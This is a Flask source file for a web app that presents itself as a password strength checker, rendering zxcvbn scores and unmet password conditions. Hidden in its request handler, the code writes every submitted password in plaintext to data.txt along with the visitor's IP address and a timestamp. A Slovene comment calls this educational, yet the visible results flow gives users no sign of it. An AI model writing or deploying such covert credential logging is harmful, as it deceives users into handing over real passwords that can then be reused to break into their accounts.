from flask import Flask, render_template, request, redirect, url_for
import datetime
import os
import json

app = Flask(__name__)
DATA_FILE = 'data.txt'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        password = request.form.get('password', '')
        user_ip = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Shranjevanje v data.txt za izobraževalne namene
        if password:
            try:
                with open(DATA_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"[{timestamp}] IP: {user_ip} | Geslo: {password}\n")
            except Exception as e:
                print(f"Napaka pri pisanju: {e}")

        # Pridobivanje podatkov iz obrazca
        zxcvbn_raw = request.form.get('zxcvbn_result')
        fulfilled_raw = request.form.get('fulfilled_conditions')
        unfulfilled_raw = request.form.get('unfulfilled_conditions')
        entropy = request.form.get('entropy', '0')

        if not zxcvbn_raw or not fulfilled_raw:
            return redirect(url_for('index'))

        try:
            zxcvbn_data = json.loads(zxcvbn_raw)
            fulfilled = json.loads(fulfilled_raw)
            unfulfilled = json.loads(unfulfilled_raw)
            error_count = len(unfulfilled)

            return render_template(
                'results.html', 
                password=password, 
                data=zxcvbn_data, 
                entropy=entropy,
                fulfilled=fulfilled,
                unfulfilled=unfulfilled,
                error_count=error_count
            )
        except json.JSONDecodeError:
            return redirect(url_for('index'))

    return render_template('index.html')

if __name__ == '__main__':
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, 'w', encoding='utf-8').close()
    app.run(debug=True)